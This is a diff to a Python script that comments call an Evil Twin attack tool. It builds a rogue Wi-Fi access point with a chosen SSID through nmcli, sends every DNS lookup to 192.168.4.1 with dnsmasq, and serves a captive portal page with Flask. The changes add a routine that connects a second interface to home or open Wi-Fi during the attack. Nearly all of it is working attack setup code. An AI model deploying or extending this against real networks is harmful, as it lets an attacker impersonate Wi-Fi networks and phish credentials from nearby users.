@@ -19,29 +19,37 @@ def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if
     return result     
 
 #Configruration
-IFACE = selected_options['WLAN']
 PORTAL_IP = "192.168.4.1"
+IFACE_INTERNET = "wlan1"
+IFACE_AP = selected_options['WLAN']
 WIFI_SSID = selected_options["SSID"]
 PORTAL = selected_options["PORTAL"]
 
-config_dnsmasq = textwrap.dedent(f"""\
-interface={IFACE}
-bind-interfaces
-address=/#/192.168.4.1
-no-resolv
-""")
-
 def configure_dnsmasq():
     path = "/etc/NetworkManager/dnsmasq-shared.d/captive.conf"
-
+    os.makedirs(os.path.dirname(path), exist_ok=True)
     with open(path, "w") as f:
          f.write("address=/#/192.168.4.1\n")
 
+#This funkcion connects to the open wifi network that is available in the area. This is useful if you want to use the internet while running the Evil Twin attack.
+def connect_open_wifi():
+    #HOME WIFI - Wlan1 feature: connects to your home wifi that was previously connected to, so you can still use the internet while running the Evil Twin attack.
+    cmd(["nmcli", "connection", "up", "$(nmcli -g GENERAL.CONNECTION device show wlan0)", "ifname", IFACE_INTERNET], ignore_error=True,)
+
+
+    #If home wifi is not connected, it will try to connect to the strongest open wifi network available.
+    cmd(["nmcli", "device", "wifi", "rescan", "ifname", IFACE_INTERNET], ignore_error=True)
+    vystup = cmd(["nmcli", "--terse", "--fields", "SSID", "device", "wifi", "list", "ifname", IFACE_INTERNET, "--filter", "SECURITY.SECURITY==--"], ignore_error=True)
+    site = [line.strip() for line in vystup.stdout.split("\n") if line.strip() and line.strip() != "--"]
+    strongest_open_wifi = site[0] if site else None
+    if strongest_open_wifi:
+        cmd(["nmcli", "device", "wifi", "connect", strongest_open_wifi, "ifname", IFACE_INTERNET], ignore_error=True)
+
+
 def starting_services():
-     #Starting the servecises
+     #This deletes the Hotspot connection if it already exists, so we can prevent any collisions with the new Hotspot connection we are about to create.
      cmd(["nmcli", "connection", "delete", "Hotspot"], ignore_error=True)
-     cmd(["nmcli", "connection", "up", "$(nmcli -g GENERAL.CONNECTION device show wlan0)", "ifname", "wlan1"], ignore_error=True)#Wlan1 feature: connects to your wifi that wlan0 does when it aouto connects
-     cmd(["nmcli", "connection", "add", "type", "wifi", "ifname", IFACE, "con-name", "Hotspot", "ssid", WIFI_SSID]); 
+     cmd(["nmcli", "connection", "add", "type", "wifi", "ifname", IFACE_AP, "con-name", "Hotspot", "ssid", WIFI_SSID]); 
      cmd(["nmcli", "connection", "modify", "Hotspot", "802-11-wireless.mode", "ap", "ipv4.method", "shared", "ipv4.addresses", "192.168.4.1/24", "connection.autoconnect", "no"]); 
      cmd(["nmcli", "connection", "up", "Hotspot"])
      print("Step 1 DONE services are running ")
@@ -72,12 +80,13 @@ def apple_captive_test():
 def start_portal():
      print("Starting web server on port 80...")
      app.run(host="0.0.0.0", port=80, debug=True, use_reloader=False)
-     #app.run(host=PORTAL_IP, port=80, debug=False, use_reloader=False)
+
      print("PORTAL =", PORTAL)
      print("TEMPLATE FOLDER =", os.path.join(base_dir, "templates"))
 
 
 def main():
+    connect_open_wifi()
     configure_dnsmasq()
     starting_services()
     start_portal() 
